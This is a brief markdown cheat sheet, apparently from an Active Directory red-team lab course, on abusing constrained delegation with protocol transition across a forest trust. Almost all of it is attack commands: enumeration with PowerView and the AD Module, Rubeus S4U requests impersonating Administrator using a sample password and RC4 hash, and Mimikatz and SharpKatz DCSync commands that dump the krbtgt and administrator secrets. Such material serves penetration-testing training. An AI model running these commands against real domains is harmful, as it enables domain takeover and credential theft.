# Cross Forest Attacks - Delegations

- [Cross Forest Attacks - Delegations](#cross-forest-attacks---delegations)
  - [Privilege Escalation - Constrained Delegation with Protocol Transition](#privilege-escalation---constrained-delegation-with-protocol-transition)

---

## Privilege Escalation - Constrained Delegation with Protocol Transition

The classic Constrained Delegation does not work across forest trusts, but we can abuse it once we have a beachhead/foothold across forest trust.

- PowerView

```
Get-DomainUser –TrustedToAuth -Domain eu.local
Get-DomainComputer –TrustedToAuth -Domain eu.local
```

- AD Module

```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server eu.local
```

<br/>

We can request an alternate ticket using Rubeus:

```
C:\AD\Tools\Rubeus.exe hash /password:Qwerty@123 /user:storagesvc /domain:eu.local
```

```
C:\AD\Tools\Rubeus.exe s4u /user:storagesvc /rc4:068A0A7194F8884732E4F5A7CB47E17C /impersonateuser:Administrator /domain:eu.local /msdsspn:nmagent/eu-dc.eu.local /altservice:ldap /dc:eu-dc.eu.local /ptt
```

<br/>

Abuse the TGS to LDAP:

- Mimikatz

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:eu\krbtgt /domain:eu.local"'
```

- SharpKatz.exe

```
C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\krbtgt --Domain eu.local --DomainController eu-dc.eu.local
```

```
C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\administrator --Domain eu.local --DomainController eu-dc.eu.local
```

<br/>

